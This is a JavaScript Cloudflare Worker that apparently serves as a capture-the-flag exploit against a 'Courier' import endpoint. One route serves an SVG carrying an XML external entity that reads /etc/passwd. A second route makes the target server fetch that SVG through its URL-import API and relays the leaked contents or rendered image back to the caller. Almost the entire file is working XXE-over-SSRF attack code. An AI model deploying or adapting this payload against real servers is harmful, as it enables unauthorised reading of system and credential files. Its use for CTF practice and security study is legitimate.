export default {
  async fetch(request) {
    const url = new URL(request.url);
    
    // PATH 1: Serve the malicious SVG (when Courier fetches it)
    if (url.pathname === '/evil.svg') {
      const svg = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>`;
      
      return new Response(svg, {
        headers: { 'Content-Type': 'image/svg+xml' }
      });
    }
    
    // PATH 2: Trigger attack (you call this manually)
    if (url.pathname === '/attack') {
      // Hardcode your worker URL here
      const workerUrl = 'https://YOUR_WORKER_NAME.YOUR_SUBDOMAIN.workers.dev/evil.svg';
      
      const resp = await fetch('http://courier.3cc83feaa3b37384a190dd84b25a4592.xyz/api/import.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: workerUrl }),
      });
      
      const contentType = resp.headers.get('content-type') || '';
      
      // If we got an image back - flag might be rendered in it!
      if (contentType.includes('image')) {
        const buffer = await resp.arrayBuffer();
        const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
        return new Response(`<img src="data:${contentType};base64,${base64}">`, {
          headers: { 'Content-Type': 'text/html' }
        });
      }
      
      const body = await resp.text();
      return new Response(JSON.stringify({
        status: resp.status,
        contentType,
        body
      }, null, 2));
    }
    
    return new Response('Use /attack or /evil.svg');
  }
}
